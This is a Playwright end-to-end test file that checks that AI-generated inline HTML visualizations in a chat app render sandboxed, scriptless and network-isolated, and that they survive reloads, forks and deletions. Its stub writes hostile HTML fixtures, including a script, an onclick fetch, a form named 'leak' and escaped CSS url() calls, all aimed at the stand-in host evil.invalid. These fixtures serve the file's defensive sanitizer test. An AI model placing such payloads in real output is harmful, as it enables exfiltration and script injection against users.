import { expect, test } from "@playwright/test";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { createE2EChatAgent } from "./support/chat-agent";

const cleanupPaths = new Set<string>();

test.afterEach(async () => {
  await Promise.all([...cleanupPaths].map((target) => fs.rm(target, { recursive: true, force: true })));
  cleanupPaths.clear();
});

async function createInlineVisualCodexStub() {
  const stubDirectory = await fs.mkdtemp(path.join(os.tmpdir(), "rudder-e2e-inline-visual-"));
  cleanupPaths.add(stubDirectory);
  const stubPath = path.join(stubDirectory, "codex-inline-visual");
  await fs.writeFile(stubPath, `#!/usr/bin/env node
import fs from "node:fs";
import path from "node:path";
let prompt = "";
process.stdin.setEncoding("utf8");
process.stdin.on("data", (chunk) => { prompt += chunk; });
process.stdin.on("end", () => {
  const visualizeSkillDir = path.join(process.env.CODEX_HOME, "skills", "visualize");
  const skillContract = fs.readFileSync(path.join(visualizeSkillDir, "SKILL.md"), "utf8");
  const runtimeContract = fs.readFileSync(path.join(visualizeSkillDir, "references", "runtime-contract.md"), "utf8");
  const exampleFragment = fs.readFileSync(path.join(visualizeSkillDir, "assets", "example-chart.html"), "utf8");
  if (
    !skillContract.includes('::codex-inline-vis{file="<title>.html"}')
    || !runtimeContract.includes("scriptless")
    || !exampleFragment.includes('id="widget"')
  ) {
    throw new Error("Rudder visualize skill package is incomplete");
  }
  const threadId = "019f6400-1111-7222-8333-444444444444";
  const now = new Date();
  const threadDir = path.join(
    process.env.CODEX_HOME,
    "visualizations",
    String(now.getFullYear()),
    String(now.getMonth() + 1).padStart(2, "0"),
    String(now.getDate()).padStart(2, "0"),
    threadId,
  );
  fs.mkdirSync(threadDir, { recursive: true });
  fs.writeFileSync(path.join(threadDir, "growth-report.html"), [
    '<style>',
    '.artifact-themed{color:rgb(12 34 56);display:grid;gap:7px}',
    '@media (max-width:2000px){.artifact-themed{border-left:9px solid rgb(22 44 66)}}',
    '@import url("https://evil.invalid/import.css");',
    '.blocked-url{background-image:url("https://evil.invalid/image.css")}',
    '.blocked-escaped-url{background-image:u\\\\72l("https://evil.invalid/escaped.css")}',
    '</style>',
    '<div id="widget" class="card viz-grid">',
    '<details open><summary data-tooltip="Completed runs are persisted">Completed runs</summary><p id="count" class="viz-stat-value artifact-themed blocked-url blocked-escaped-url">12 runs</p></details>',
    '<svg role="img" aria-label="Completed runs chart" viewBox="0 0 320 90"><title>Completed runs</title><path fill="var(--viz-series-1)" d="M10 60h240v20H10z"/></svg>',
    '<button id="active-button" onclick="fetch(\\"https://evil.invalid/click\\")">Do not keep</button>',
    '<img src="https://evil.invalid/image.png">',
    '<a href="https://evil.invalid/navigation">Do not navigate</a>',
    '<form action="https://evil.invalid/form"><input name="leak"><button>Send</button></form>',
    '<script>window.__rudderInlineVisualScriptExecuted=true;fetch("https://evil.invalid/script");location.href="https://evil.invalid/self-navigation"</script>',
    '</div>',
  ].join(""));
  const sentinel = prompt.match(/(__RUDDER_RESULT_[a-f0-9-]+__)/i)?.[1] ?? "__RUDDER_RESULT_TEST__";
  const body = "Completed-run report.\\n\\n::codex-inline-vis{file=\\\"growth-report.html\\\"}";
  const finalText = sentinel + JSON.stringify({ kind: "message", body, structuredPayload: null });
  process.stdout.write(JSON.stringify({ type: "thread.started", thread_id: threadId, model: "gpt-5.4" }) + "\\n");
  process.stdout.write(JSON.stringify({ type: "item.completed", item: { id: "msg-1", type: "agent_message", text: finalText } }) + "\\n");
  process.stdout.write(JSON.stringify({ type: "turn.completed", result: finalText, usage: { input_tokens: 1, cached_input_tokens: 0, output_tokens: 1 } }) + "\\n");
});
`, "utf8");
  await fs.chmod(stubPath, 0o755);
  return stubPath;
}

test("deterministic Codex visual is declarative, network-isolated, and durable", async ({ page }) => {
  const externalRequests: string[] = [];
  page.on("request", (request) => {
    if (request.url().includes("evil.invalid")) externalRequests.push(request.url());
  });

  const stubPath = await createInlineVisualCodexStub();
  const orgResponse = await page.request.post("/api/orgs", {
    data: { name: `Inline-Visual-${Date.now()}` },
  });
  expect(orgResponse.ok()).toBe(true);
  const organization = await orgResponse.json() as { id: string; issuePrefix: string };
  const agent = await createE2EChatAgent(page.request, organization.id, {
    name: "Visual Agent",
    command: stubPath,
  }) as { id: string };

  await page.goto("/");
  await page.evaluate((orgId) => {
    window.localStorage.setItem("rudder.selectedOrganizationId", orgId);
  }, organization.id);
  await page.goto(`/chat?agentId=${agent.id}`);

  const composer = page.locator(".rudder-mdxeditor-content").first();
  await expect(composer).toBeVisible({ timeout: 15_000 });
  await composer.fill("Create a completed-run report");
  await page.getByRole("button", { name: "Send" }).click();

  const assistant = page.getByTestId("chat-assistant-message").last();
  await expect(assistant).toContainText("Completed-run report.", { timeout: 20_000 });
  await expect(assistant).not.toContainText("::codex-inline-vis");
  const chatId = new URL(page.url()).pathname.split("/").pop()!;
  const messagesResponse = await page.request.get(`/api/chats/${chatId}/messages?includeTranscript=false`);
  expect(messagesResponse.ok()).toBe(true);
  const persistedMessages = await messagesResponse.json() as Array<{
    id: string;
    role: string;
    structuredPayload: Record<string, unknown> | null;
    attachments: Array<{
      id: string;
      contentType: string;
      provider?: unknown;
      objectKey?: unknown;
    }>;
  }>;
  const persistedAssistant = persistedMessages.find((message) => message.role === "assistant")!;
  expect(persistedAssistant).toMatchObject({
    structuredPayload: {
      inlineVisuals: [{
        directiveIndex: 0,
        file: "growth-report.html",
        status: "ready",
        attachmentId: expect.any(String),
      }],
    },
    attachments: [expect.objectContaining({ contentType: "text/html" })],
  });
  expect(persistedAssistant.attachments[0]?.provider).toBeUndefined();
  expect(persistedAssistant.attachments[0]?.objectKey).toBeUndefined();

  const iframe = assistant.locator("iframe");
  await expect(iframe).toHaveAttribute("sandbox", "allow-same-origin");
  await expect(iframe).not.toHaveAttribute("sandbox", /allow-scripts/);
  const frame = iframe.contentFrame();
  await expect(frame.getByText("12 runs")).toBeVisible({ timeout: 15_000 });
  await expect(frame.getByRole("img", { name: "Completed runs chart" })).toBeVisible();
  await expect(frame.locator("body").locator("script, style, link, img, iframe, object, form, input, button, a")).toHaveCount(0);
  await expect(frame.locator("body")).not.toContainText("Do not keep");
  await expect(frame.locator("body")).not.toContainText("Do not navigate");
  await expect(frame.locator("body")).not.toContainText("Send");
  await expect.poll(() => frame.locator("#count").evaluate((element) => {
    const style = getComputedStyle(element);
    return {
      color: style.color,
      display: style.display,
      gap: style.gap,
      borderLeftWidth: style.borderLeftWidth,
    };
  })).toEqual({
    color: "rgb(12, 34, 56)",
    display: "grid",
    gap: "7px",
    borderLeftWidth: "9px",
  });
  const summary = frame.locator("summary");
  await summary.hover();
  await expect.poll(() => summary.evaluate((element) => getComputedStyle(element, "::after").content))
    .toContain("Completed runs are persisted");
  expect(await frame.locator("body").evaluate(() => ({
    scriptExecuted: Boolean((window as Window & { __rudderInlineVisualScriptExecuted?: boolean }).__rudderInlineVisualScriptExecuted),
    location: window.location.href,
  }))).toEqual({ scriptExecuted: false, location: "about:srcdoc" });
  await page.waitForTimeout(300);
  expect(externalRequests).toEqual([]);

  await page.reload();
  const reopenedAssistant = page.getByTestId("chat-assistant-message").last();
  await expect(reopenedAssistant).toContainText("Completed-run report.", { timeout: 20_000 });
  await expect(reopenedAssistant).not.toContainText("::codex-inline-vis");
  const reopenedIframe = reopenedAssistant.locator("iframe");
  await expect(reopenedIframe).toHaveAttribute("sandbox", "allow-same-origin");
  const reopenedFrame = reopenedIframe.contentFrame();
  await expect(reopenedFrame.getByText("12 runs")).toBeVisible({ timeout: 15_000 });
  expect(await reopenedFrame.locator("body").evaluate(() =>
    Boolean((window as Window & { __rudderInlineVisualScriptExecuted?: boolean }).__rudderInlineVisualScriptExecuted)
  )).toBe(false);
  expect(externalRequests).toEqual([]);

  const screenshotPath = process.env.RUDDER_INLINE_VIS_SCREENSHOT?.trim();
  if (screenshotPath) {
    await page.mouse.move(1100, 680);
    await page.screenshot({ path: screenshotPath, fullPage: false, animations: "disabled" });
    await page.setViewportSize({ width: 390, height: 844 });
    await expect(reopenedAssistant).toBeVisible();
    await expect(reopenedFrame.getByText("12 runs")).toBeVisible();
    await page.screenshot({
      path: screenshotPath.replace(/\.png$/i, "-mobile.png"),
      fullPage: false,
      animations: "disabled",
    });
  }

  await page.setViewportSize({ width: 1280, height: 720 });
  await reopenedAssistant.hover();
  const forkResponsePromise = page.waitForResponse((response) =>
    response.request().method() === "POST"
    && response.url().includes(`/api/chats/${chatId}/fork`),
  );
  await reopenedAssistant.getByRole("button", { name: "Fork from here" }).click();
  const forkResponse = await forkResponsePromise;
  expect(forkResponse.ok()).toBe(true);
  const firstFork = await forkResponse.json() as { id: string };
  await expect(page).toHaveURL(new RegExp(`/chat/${firstFork.id}$`));
  const forkedAssistant = page.getByTestId("chat-assistant-message").filter({
    hasText: "Completed-run report.",
  }).last();
  await expect(forkedAssistant).not.toContainText("::codex-inline-vis");
  const forkedFrame = forkedAssistant.locator("iframe").contentFrame();
  await expect(forkedFrame.getByText("12 runs")).toBeVisible({ timeout: 15_000 });
  await expect(forkedFrame.locator("script, img, form, input, button, a")).toHaveCount(0);
  expect(externalRequests).toEqual([]);

  const deleteForkResponse = await page.request.delete(`/api/chats/${firstFork.id}`);
  expect(deleteForkResponse.ok()).toBe(true);
  await page.goto(`/chat/${chatId}`);
  const sourceAfterForkDelete = page.getByTestId("chat-assistant-message").filter({
    hasText: "Completed-run report.",
  }).last();
  await expect(sourceAfterForkDelete.locator("iframe").contentFrame().getByText("12 runs")).toBeVisible({ timeout: 15_000 });

  const secondForkResponse = await page.request.post(`/api/chats/${chatId}/fork`, {
    data: { sourceMessageId: persistedAssistant.id, title: "Visual durability fork" },
  });
  expect(secondForkResponse.ok()).toBe(true);
  const secondFork = await secondForkResponse.json() as { id: string };
  const deleteSourceResponse = await page.request.delete(`/api/chats/${chatId}`);
  expect(deleteSourceResponse.ok()).toBe(true);
  await page.goto(`/chat/${secondFork.id}`);
  const forkAfterSourceDelete = page.getByTestId("chat-assistant-message").filter({
    hasText: "Completed-run report.",
  }).last();
  const durableFrame = forkAfterSourceDelete.locator("iframe").contentFrame();
  await expect(durableFrame.getByText("12 runs")).toBeVisible({ timeout: 15_000 });
  await expect(durableFrame.locator("script, img, form, input, button, a")).toHaveCount(0);
  expect(externalRequests).toEqual([]);
});
